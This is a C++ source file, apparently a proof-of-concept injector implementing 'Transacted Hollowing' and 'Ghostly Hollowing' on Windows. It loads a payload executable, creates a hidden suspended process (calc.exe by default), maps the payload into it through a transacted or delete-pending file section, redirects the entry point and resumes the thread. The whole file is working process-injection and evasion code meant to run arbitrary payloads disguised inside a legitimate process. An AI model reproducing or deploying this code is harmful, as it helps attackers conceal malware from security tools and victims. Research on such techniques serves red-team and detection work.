#include <Windows.h>
#include <KtmW32.h>

#include <iostream>
#include <stdio.h>

#include "ntddk.h"
#include "kernel32_undoc.h"
#include "util.h"

#include "pe_hdrs_helper.h"
#include "hollowing_parts.h"

#ifndef GHOSTING
    #include "transacted_file.h"
#else
    #include "delete_pending_file.h"
#endif

bool create_new_process_internal(PROCESS_INFORMATION &pi, LPWSTR cmdLine, LPWSTR startDir = NULL)
{
    if (!load_kernel32_functions()) return false;

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    HANDLE hToken = NULL;
    HANDLE hNewToken = NULL;
    if (!CreateProcessInternalW(hToken,
        NULL, //lpApplicationName
        (LPWSTR)cmdLine, //lpCommandLine
        NULL, //lpProcessAttributes
        NULL, //lpThreadAttributes
        FALSE, //bInheritHandles
        CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW, //dwCreationFlags
        NULL, //lpEnvironment 
        startDir, //lpCurrentDirectory
        &si, //lpStartupInfo
        &pi, //lpProcessInformation
        &hNewToken
    ))
    {
        printf("[ERROR] CreateProcessInternalW failed, Error = %x\n", GetLastError());
        return false;
    }
    return true;
}

PVOID map_buffer_into_process(HANDLE hProcess, HANDLE hSection)
{
    NTSTATUS status = STATUS_SUCCESS;
    SIZE_T viewSize = 0;
    PVOID sectionBaseAddress = 0;

    if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_READONLY)) != STATUS_SUCCESS)
    {
        if (status == STATUS_IMAGE_NOT_AT_BASE) {
            std::cerr << "[WARNING] Image could not be mapped at its original base! If the payload has no relocations, it won't work!\n";
        }
        else {
            std::cerr << "[ERROR] NtMapViewOfSection failed, status: " << std::hex << status << std::endl;
            return NULL;
        }
    }
    std::cout << "Mapped Base:\t" << std::hex << (ULONG_PTR)sectionBaseAddress << "\n";
    return sectionBaseAddress;
}

bool transacted_hollowing(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
{
    wchar_t dummy_name[MAX_PATH] = { 0 };
    wchar_t temp_path[MAX_PATH] = { 0 };
    DWORD size = GetTempPathW(MAX_PATH, temp_path);
    GetTempFileNameW(temp_path, L"TH", 0, dummy_name);

#ifndef GHOSTING
    HANDLE hSection = make_transacted_section(dummy_name, payladBuf, payloadSize);
#else
    HANDLE hSection = make_section_from_delete_pending_file(dummy_name, payladBuf, payloadSize);
#endif

    if (!hSection || hSection == INVALID_HANDLE_VALUE) {
        std::cout << "Creating transacted section has failed!\n";
        return false;
    }
    wchar_t *start_dir = NULL;
    wchar_t dir_path[MAX_PATH] = { 0 };
    get_directory(targetPath, dir_path, NULL);
    if (wcsnlen(dir_path, MAX_PATH) > 0) {
        start_dir = dir_path;
    }
    PROCESS_INFORMATION pi = { 0 };
    if (!create_new_process_internal(pi, targetPath, start_dir)) {
        std::cerr << "Creating process failed!\n";
        return false;
    }
    std::cout << "Created Process, PID: " << std::dec << pi.dwProcessId << "\n";
    HANDLE hProcess = pi.hProcess;
    PVOID remote_base = map_buffer_into_process(hProcess, hSection);
    if (!remote_base) {
        std::cerr << "Failed mapping the buffer!\n";
        return false;
    }
    bool isPayl32b = !pe_is64bit(payladBuf);
    if (!redirect_to_payload(payladBuf, remote_base, pi, isPayl32b)) {
        std::cerr << "Failed to redirect!\n";
        return false;
    }
    std::cout << "Resuming, PID " << std::dec << pi.dwProcessId << std::endl;
    //Resume the thread and let the payload run:
    ResumeThread(pi.hThread);
    return true;
}

int wmain(int argc, wchar_t *argv[])
{
#ifdef _WIN64
    const bool is32bit = false;
#else
    const bool is32bit = true;
#endif
    if (argc < 2) {
#ifndef GHOSTING
        std::cout << "Transacted Hollowing (";
#else
        std::cout << "Ghostly Hollowing (";
#endif
        if (is32bit) std::cout << "32bit";
        else std::cout << "64bit";
        std::cout << ")\n";
        std::cout << "params: <payload path> [*target path]\n";
        std::cout << "* - optional" << std::endl;
        system("pause");
        return 0;
    }
    wchar_t defaultTarget[MAX_PATH] = { 0 };
    bool useDefaultTarget = (argc > 2) ? false : true;
    wchar_t *targetPath = (argc > 2) ? argv[2] : defaultTarget;

    wchar_t *payloadPath = argv[1];
    size_t payloadSize = 0;

    BYTE* payladBuf = buffer_payload(payloadPath, payloadSize);
    if (payladBuf == NULL) {
        std::cerr << "Cannot read payload!" << std::endl;
        return -1;
    }
    bool isPayl32b = !pe_is64bit(payladBuf);
    if (is32bit && !isPayl32b) {
        std::cout << "[ERROR] The injector (32 bit) is not compatibile with the payload (64 bit)\n";
        return 1;
    }
    if (useDefaultTarget) {
        get_calc_path(defaultTarget, MAX_PATH, isPayl32b);
    }

    bool is_ok = transacted_hollowing(targetPath, payladBuf, (DWORD) payloadSize);

    free_buffer(payladBuf);
    if (is_ok) {
        std::cerr << "[+] Done!" << std::endl;
    } else {
        std::cerr << "[-] Failed!" << std::endl;
#ifdef _DEBUG
        system("pause");
#endif
        return -1;
    }
#ifdef _DEBUG
    system("pause");
#endif
    return 0;
}
